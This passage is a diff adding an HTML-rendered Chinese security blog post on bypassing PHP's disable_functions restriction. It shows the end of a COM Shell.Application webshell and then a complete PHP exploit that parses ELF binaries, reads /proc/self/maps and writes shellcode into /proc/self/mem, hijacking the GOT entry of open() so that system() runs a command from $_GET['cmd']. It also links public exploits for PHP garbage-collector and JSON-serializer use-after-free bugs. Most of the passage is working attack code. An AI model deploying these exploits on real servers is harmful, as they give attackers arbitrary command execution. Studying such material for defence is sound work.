+    <span class="hljs-variable">$wshit</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">COM</span>(<span class="hljs-string">&quot;Shell.Application&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Shell.Application Failed!&quot;</span>);
+    <span class="hljs-variable">$exec</span> = <span class="hljs-variable">$wshit</span>-&gt;<span class="hljs-title function_ invoke__">ShellExecute</span>(<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/c &quot;</span>.<span class="hljs-variable">$command</span>);
+&#125; 
+<span class="hljs-keyword">else</span> &#123;
+  <span class="hljs-keyword">echo</span>(<span class="hljs-number">0</span>);
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<h2 id="劫持got表绕过"><a href="#劫持got表绕过" class="headerlink" title="劫持got表绕过"></a>劫持got表绕过</h2><p>在动态链接的情况下，程序加载的时候并不会把链接库中所有函数都一起加载进来，而是程序执行的时候按需加载，如果有函数并没有被调用，那么它就不会在程序生命中被加载进来。简单说就是，函数第一次用到的时候才会把在自己的真实地址给写到相应的got表里，没用到就不绑定了。这就是<strong>延迟绑定</strong>，由于这个机制，第一次调用函数的时候，got表中“存放”的地址不是函数的真实地址，而是<code>plt</code> 表中的第二条汇编指令，接下来会进行一系列操作装载相应的动态链接库，将函数的真实地址写在got表中。以后调用该函数时，got表保存着其真实地址。</p>
+<p>这里劫持got表就是修改函数的got表的地址的内容为我们的shellcode的地址</p>
+<ul>
+<li>step 1:通过php脚本解析<code>/proc/self/exe</code>得到open函数的got表的地址。</li>
+<li>step 2:通过读取<code>/proc/self/maps</code>得到程序基地址，栈地址，与libc基地址。</li>
+<li>step 3:通过php脚本解析libc得到system函数的地址，结合libc基地址（两者相加）可以得到system函数的实际地址。</li>
+<li>step 4:通过读写<code>/proc/self/mem</code>实现修改open函数的got表的地址的内容为我们的shellcode的地址。向我们指定的shellcode的地址写入我们的shellcode。</li>
+</ul>
+<p>exp（命令无回显，如果没有权限读写&#x2F;proc&#x2F;self&#x2F;mem，自然也就无法利用了）</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">/***</span>
+<span class="hljs-comment"> *</span>
+<span class="hljs-comment">* BUG修正请联系我</span>
+<span class="hljs-comment">* <span class="hljs-doctag">@author</span></span>
+<span class="hljs-comment">* <span class="hljs-doctag">@email</span> xiaozeend<span class="hljs-doctag">@pm</span>.me *</span>
+<span class="hljs-comment">*/</span>
+<span class="hljs-comment">/*</span>
+<span class="hljs-comment">section tables type</span>
+<span class="hljs-comment">*/</span>
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_NULL&#x27;</span>,<span class="hljs-number">0</span>);
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_PROGBITS&#x27;</span>,<span class="hljs-number">1</span>);
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_SYMTAB&#x27;</span>,<span class="hljs-number">2</span>);
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_STRTAB&#x27;</span>,<span class="hljs-number">3</span>);
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_RELA&#x27;</span>,<span class="hljs-number">4</span>);
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_HASH&#x27;</span>,<span class="hljs-number">5</span>);
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_DYNAMIC&#x27;</span>,<span class="hljs-number">6</span>);
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_NOTE&#x27;</span>,<span class="hljs-number">7</span>);
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_NOBITS&#x27;</span>,<span class="hljs-number">8</span>);
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_REL&#x27;</span>,<span class="hljs-number">9</span>);
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_SHLIB&#x27;</span>,<span class="hljs-number">10</span>);
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_DNYSYM&#x27;</span>,<span class="hljs-number">11</span>);
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_INIT_ARRAY&#x27;</span>,<span class="hljs-number">14</span>);
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_FINI_ARRAY&#x27;</span>,<span class="hljs-number">15</span>);
+<span class="hljs-comment">//why does section tables have so many fuck type</span>
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_GNU_HASH&#x27;</span>,<span class="hljs-number">0x6ffffff6</span>);
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_GNU_versym&#x27;</span>,<span class="hljs-number">0x6fffffff</span>);
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_GNU_verneed&#x27;</span>,<span class="hljs-number">0x6ffffffe</span>);
+
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">elf</span></span>&#123;
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$elf_bin</span>;
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$strtab_section</span>=<span class="hljs-keyword">array</span>();
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$rel_plt_section</span>=<span class="hljs-keyword">array</span>();
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$dynsym_section</span>=<span class="hljs-keyword">array</span>();
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shared_librarys</span>=<span class="hljs-keyword">array</span>();
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rel_plts</span>=<span class="hljs-keyword">array</span>();
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getElfBin</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function"></span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;elf_bin;
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setElfBin</span>(<span class="hljs-params"><span class="hljs-variable">$elf_bin</span></span>)</span>
+<span class="hljs-function"></span>&#123;
+        <span class="hljs-variable language_">$this</span>-&gt;elf_bin = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$elf_bin</span>,<span class="hljs-string">&quot;rb&quot;</span>);
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unp</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>
+<span class="hljs-function"></span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$value</span>)));
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$start</span>,<span class="hljs-variable">$len</span></span>)</span>&#123;
+
+        <span class="hljs-title function_ invoke__">fseek</span>(<span class="hljs-variable">$this</span>-&gt;elf_bin,<span class="hljs-variable">$start</span>);
+        <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">fread</span> (<span class="hljs-variable">$this</span>-&gt;elf_bin,<span class="hljs-variable">$len</span>);
+        <span class="hljs-title function_ invoke__">rewind</span>(<span class="hljs-variable">$this</span>-&gt;elf_bin);
+        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">unp</span>(<span class="hljs-variable">$data</span>);
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_section</span>(<span class="hljs-params"><span class="hljs-variable">$elf_bin</span>=<span class="hljs-string">&quot;&quot;</span></span>)</span>&#123;
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$elf_bin</span>)&#123;
+            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">setElfBin</span>(<span class="hljs-variable">$elf_bin</span>);
+        &#125;
+        <span class="hljs-variable language_">$this</span>-&gt;elf_shoff=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">0x28</span>,<span class="hljs-number">8</span>);
+        <span class="hljs-variable language_">$this</span>-&gt;elf_shentsize=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">0x3a</span>,<span class="hljs-number">2</span>);
+        <span class="hljs-variable language_">$this</span>-&gt;elf_shnum=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">0x3c</span>,<span class="hljs-number">2</span>);
+        <span class="hljs-variable language_">$this</span>-&gt;elf_shstrndx=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">0x3e</span>,<span class="hljs-number">2</span>);
+        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable language_">$this</span>-&gt;elf_shnum;<span class="hljs-variable">$i</span>+=<span class="hljs-number">1</span>)&#123;
+            <span class="hljs-variable">$sh_type</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">4</span>,<span class="hljs-number">4</span>);
+            <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$sh_type</span>)&#123;
+                <span class="hljs-keyword">case</span> SHT_STRTAB:
+                    <span class="hljs-variable language_">$this</span>-&gt;strtab_section[<span class="hljs-variable">$i</span>]=
+                        <span class="hljs-keyword">array</span>(
+                            <span class="hljs-string">&#x27;strtab_offset&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">24</span>,<span class="hljs-number">8</span>),
+                            <span class="hljs-string">&#x27;strtab_size&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;strtab_size=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">32</span>,<span class="hljs-number">8</span>)
+                        );
+                    <span class="hljs-keyword">break</span>;
+
+                <span class="hljs-keyword">case</span> SHT_RELA:
+                    <span class="hljs-variable language_">$this</span>-&gt;rel_plt_section[<span class="hljs-variable">$i</span>]=
+                        <span class="hljs-keyword">array</span>(
+                            <span class="hljs-string">&#x27;rel_plt_offset&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">24</span>,<span class="hljs-number">8</span>),
+                            <span class="hljs-string">&#x27;rel_plt_size&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;strtab_size=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">32</span>,<span class="hljs-number">8</span>),
+                            <span class="hljs-string">&#x27;rel_plt_entsize&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">56</span>,<span class="hljs-number">8</span>)
+                        );
+                    <span class="hljs-keyword">break</span>;
+                <span class="hljs-keyword">case</span> SHT_DNYSYM:
+                    <span class="hljs-variable language_">$this</span>-&gt;dynsym_section[<span class="hljs-variable">$i</span>]=
+                        <span class="hljs-keyword">array</span>(
+                            <span class="hljs-string">&#x27;dynsym_offset&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">24</span>,<span class="hljs-number">8</span>),
+                            <span class="hljs-string">&#x27;dynsym_size&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;strtab_size=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">32</span>,<span class="hljs-number">8</span>),
+                            <span class="hljs-string">&#x27;dynsym_entsize&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">56</span>,<span class="hljs-number">8</span>)
+                        );
+                    <span class="hljs-keyword">break</span>;
+
+                <span class="hljs-keyword">case</span> SHT_NULL:
+                <span class="hljs-keyword">case</span> SHT_PROGBITS:
+                <span class="hljs-keyword">case</span> SHT_DYNAMIC:
+                <span class="hljs-keyword">case</span> SHT_SYMTAB:
+                <span class="hljs-keyword">case</span> SHT_NOBITS:
+                <span class="hljs-keyword">case</span> SHT_NOTE:
+                <span class="hljs-keyword">case</span> SHT_FINI_ARRAY:
+                <span class="hljs-keyword">case</span> SHT_INIT_ARRAY:
+                <span class="hljs-keyword">case</span> SHT_GNU_versym:
+                <span class="hljs-keyword">case</span> SHT_GNU_HASH:
+                     <span class="hljs-keyword">break</span>;
+
+                <span class="hljs-keyword">default</span>:
+ <span class="hljs-comment">//                   echo &quot;who knows what $sh_type this is? &quot;;</span>
+
+              &#125; 
+          &#125;
+     &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_reloc</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-variable">$rel_plts</span>=<span class="hljs-keyword">array</span>();
+        <span class="hljs-variable">$dynsym_section</span>= <span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$this</span>-&gt;dynsym_section);
+        <span class="hljs-variable">$strtab_section</span>=<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$this</span>-&gt;strtab_section);
+        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;rel_plt_section <span class="hljs-keyword">as</span> <span class="hljs-variable">$rel_plt</span> )&#123;
+             <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-variable">$rel_plt</span>[<span class="hljs-string">&#x27;rel_plt_offset&#x27;</span>];<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$rel_plt</span>[<span class="hljs-string">&#x27;rel_plt_offset&#x27;</span>]+<span class="hljs-variable">$rel_plt</span>[<span class="hljs-string">&#x27;rel_plt_size&#x27;</span>];<span class="hljs-variable">$i</span>+=<span class="hljs-variable">$rel_plt</span>[<span class="hljs-string">&#x27;rel_plt_entsize&#x27;</span>])
+             &#123;
+                <span class="hljs-variable">$rel_offset</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$i</span>,<span class="hljs-number">8</span>);
+                <span class="hljs-variable">$rel_info</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$i</span>+<span class="hljs-number">8</span>,<span class="hljs-number">8</span>)&gt;&gt;<span class="hljs-number">32</span>;
+                <span class="hljs-variable">$fun_name_offset</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_offset&#x27;</span>]+<span class="hljs-variable">$rel_info</span>*<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_entsize&#x27;</span>],<span class="hljs-number">4</span>);
+                <span class="hljs-variable">$fun_name_offset</span>=<span class="hljs-variable">$strtab_section</span>[<span class="hljs-string">&#x27;strtab_offset&#x27;</span>]+<span class="hljs-variable">$fun_name_offset</span>-<span class="hljs-number">1</span>;
+                <span class="hljs-variable">$fun_name</span>=<span class="hljs-string">&#x27;&#x27;</span>;
+                <span class="hljs-keyword">while</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(++<span class="hljs-variable">$fun_name_offset</span>,<span class="hljs-number">1</span>)!=<span class="hljs-string">&quot;&quot;</span>)&#123;
+                    <span class="hljs-variable">$fun_name</span>.=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$fun_name_offset</span>,<span class="hljs-number">1</span>));
+                &#125;
+                <span class="hljs-variable">$rel_plts</span>[<span class="hljs-variable">$fun_name</span>]=<span class="hljs-variable">$rel_offset</span>;
+            &#125;
+        &#125;
+        <span class="hljs-variable language_">$this</span>-&gt;rel_plts=<span class="hljs-variable">$rel_plts</span>;
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_shared_library</span>(<span class="hljs-params"><span class="hljs-variable">$elf_bin</span>=<span class="hljs-string">&quot;&quot;</span></span>)</span>&#123;
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$elf_bin</span>)&#123;
+            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">setElfBin</span>(<span class="hljs-variable">$elf_bin</span>);
+        &#125;
+        <span class="hljs-variable">$shared_librarys</span>=<span class="hljs-keyword">array</span>();
+        <span class="hljs-variable">$dynsym_section</span>=<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$this</span>-&gt;dynsym_section);
+        <span class="hljs-variable">$strtab_section</span>=<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$this</span>-&gt;strtab_section);
+        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_offset&#x27;</span>]+<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_entsize&#x27;</span>];<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_offset&#x27;</span>]+<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_size&#x27;</span>];<span class="hljs-variable">$i</span>+=<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_entsize&#x27;</span>])
+        &#123;
+            <span class="hljs-variable">$shared_library_offset</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$i</span>+<span class="hljs-number">8</span>,<span class="hljs-number">8</span>);
+            <span class="hljs-variable">$fun_name_offset</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$i</span>,<span class="hljs-number">4</span>);
+            <span class="hljs-variable">$fun_name_offset</span>=<span class="hljs-variable">$fun_name_offset</span>+<span class="hljs-variable">$strtab_section</span>[<span class="hljs-string">&#x27;strtab_offset&#x27;</span>]-<span class="hljs-number">1</span>;
+            <span class="hljs-variable">$fun_name</span>=<span class="hljs-string">&#x27;&#x27;</span>;
+            <span class="hljs-keyword">while</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(++<span class="hljs-variable">$fun_name_offset</span>,<span class="hljs-number">1</span>)!=<span class="hljs-string">&quot;&quot;</span>)&#123;
+                <span class="hljs-variable">$fun_name</span>.=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$fun_name_offset</span>,<span class="hljs-number">1</span>));
+            &#125;
+            <span class="hljs-variable">$shared_librarys</span>[<span class="hljs-variable">$fun_name</span>]=<span class="hljs-variable">$shared_library_offset</span>;
+         &#125;
+         <span class="hljs-variable language_">$this</span>-&gt;shared_librarys=<span class="hljs-variable">$shared_librarys</span>;
+   &#125;
+   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>)</span>&#123;
+       <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$this</span>-&gt;elf_bin);
+   &#125;
+
+   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">   </span>&#123;
+       <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();
+   &#125;
+   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">packlli</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>) </span>&#123;
+       <span class="hljs-variable">$higher</span> = (<span class="hljs-variable">$value</span> &amp; <span class="hljs-number">0xffffffff00000000</span>) &gt;&gt; <span class="hljs-number">32</span>;
+       <span class="hljs-variable">$lower</span> = <span class="hljs-variable">$value</span> &amp; <span class="hljs-number">0x00000000ffffffff</span>;
+       <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">pack</span>(<span class="hljs-string">&#x27;V2&#x27;</span>, <span class="hljs-variable">$lower</span>, <span class="hljs-variable">$higher</span>);
+   &#125;
+&#125;
+<span class="hljs-variable">$test</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">elf</span>();
+<span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">get_section</span>(<span class="hljs-string">&#x27;/proc/self/exe&#x27;</span>);
+<span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">get_reloc</span>();  <span class="hljs-comment">// 获得各函数的got表的地址</span>
+<span class="hljs-variable">$open_php</span>=<span class="hljs-variable">$test</span>-&gt;rel_plts[<span class="hljs-string">&#x27;open&#x27;</span>];
+<span class="hljs-variable">$maps</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/proc/self/maps&#x27;</span>);
+<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(\w+)-(\w+)\s+.+\[stack]/&#x27;</span>, <span class="hljs-variable">$maps</span>, <span class="hljs-variable">$stack</span>);
+<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(\w+)-(\w+).*?libc-/&#x27;</span>,<span class="hljs-variable">$maps</span>,<span class="hljs-variable">$libcgain</span>);
+<span class="hljs-variable">$libc_base</span> = <span class="hljs-string">&quot;0x&quot;</span>.<span class="hljs-variable">$libcgain</span>[<span class="hljs-number">1</span>];
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Libc base: &quot;</span>.<span class="hljs-variable">$libc_base</span>.<span class="hljs-string">&quot;\n&quot;</span>;
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Stack location: &quot;</span>.<span class="hljs-variable">$stack</span>[<span class="hljs-number">1</span>].<span class="hljs-string">&quot;\n&quot;</span>;
+<span class="hljs-variable">$array_tmp</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-variable">$maps</span>);
+<span class="hljs-variable">$pie_base</span> = <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-string">&quot;0x&quot;</span>.<span class="hljs-variable">$array_tmp</span>[<span class="hljs-number">0</span>]);
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;PIE base: &quot;</span>.<span class="hljs-variable">$pie_base</span>.<span class="hljs-string">&quot;\n&quot;</span>;
+<span class="hljs-variable">$test2</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">elf</span>();
+<span class="hljs-variable">$test2</span>-&gt;<span class="hljs-title function_ invoke__">get_section</span>(<span class="hljs-string">&#x27;/usr/lib64/libc-2.17.so&#x27;</span>);
+<span class="hljs-variable">$test2</span>-&gt;<span class="hljs-title function_ invoke__">get_reloc</span>();
+<span class="hljs-variable">$test2</span>-&gt;<span class="hljs-title function_ invoke__">get_shared_library</span>();  <span class="hljs-comment">// 解析libc库，得到libc库函数的相对地址</span>
+<span class="hljs-variable">$sys</span> = <span class="hljs-variable">$test2</span>-&gt;shared_librarys[<span class="hljs-string">&#x27;system&#x27;</span>];
+<span class="hljs-variable">$sys_addr</span> = <span class="hljs-variable">$sys</span> + <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$libc_base</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;system addr:&quot;</span>.<span class="hljs-variable">$sys_addr</span>.<span class="hljs-string">&quot;\n&quot;</span>;
+<span class="hljs-variable">$mem</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;/proc/self/mem&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>);
+<span class="hljs-variable">$shellcode_loc</span> = <span class="hljs-variable">$pie_base</span> + <span class="hljs-number">0x2333</span>;
+<span class="hljs-title function_ invoke__">fseek</span>(<span class="hljs-variable">$mem</span>,<span class="hljs-variable">$open_php</span>);
+<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$mem</span>,<span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">packlli</span>(<span class="hljs-variable">$shellcode_loc</span>));
+<span class="hljs-variable">$command</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];  <span class="hljs-comment">// 我们要执行的命令</span>
+<span class="hljs-variable">$stack</span>=<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-string">&quot;0x&quot;</span>.<span class="hljs-variable">$stack</span>[<span class="hljs-number">1</span>]);
+<span class="hljs-title function_ invoke__">fseek</span>(<span class="hljs-variable">$mem</span>, <span class="hljs-variable">$stack</span>);
+<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$mem</span>, <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$command&#125;</span>\x00&quot;</span>);
+<span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$stack</span>;
+<span class="hljs-variable">$shellcode</span> = <span class="hljs-string">&quot;H\xbf&quot;</span>.<span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">packlli</span>(<span class="hljs-variable">$cmd</span>).<span class="hljs-string">&quot;H\xb8&quot;</span>.<span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">packlli</span>(<span class="hljs-variable">$sys_addr</span>).<span class="hljs-string">&quot;P\xc3&quot;</span>;
+<span class="hljs-title function_ invoke__">fseek</span>(<span class="hljs-variable">$mem</span>,<span class="hljs-variable">$shellcode_loc</span>);
+<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$mem</span>,<span class="hljs-variable">$shellcode</span>);
+<span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&#x27;zxhy&#x27;</span>);
+<span class="hljs-comment">// highlight_file(&#x27;zxhy&#x27;);</span>
+<span class="hljs-comment">// show_source(&#x27;zxhy&#x27;);</span>
+<span class="hljs-comment">// file_get_contents(&#x27;zxhy&#x27;);</span>
+<span class="hljs-keyword">exit</span>();</code></pre></div>
+
+<h2 id="利用GC-UAF"><a href="#利用GC-UAF" class="headerlink" title="利用GC UAF"></a>利用GC UAF</h2><p>此漏洞利用 PHP 垃圾收集器中一个三年前的<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=72530">bug</a>来绕过 <code>disable_functions</code> 并执行系统命令。</p>
+<ul>
+<li>Linux 操作系统</li>
+<li>PHP7.0 - all versions to date</li>
+<li>PHP7.1 - all versions to date</li>
+<li>PHP7.2 - all versions to date</li>
+<li>PHP7.3 - all versions to date</li>
+</ul>
+<p>exp：<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a></p>
+<h2 id="利用-Json-Serializer-UAF"><a href="#利用-Json-Serializer-UAF" class="headerlink" title="利用 Json Serializer UAF"></a>利用 Json Serializer UAF</h2><p>此漏洞利用json序列化程序中的释放后使用<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=77843">漏洞</a>，利用json序列化程序中的堆溢出触发，以绕过<code>disable_functions</code>和执行系统命令</p>
+<ul>
+<li>Linux 操作系统</li>
+<li>PHP7.1 - all versions to date</li>
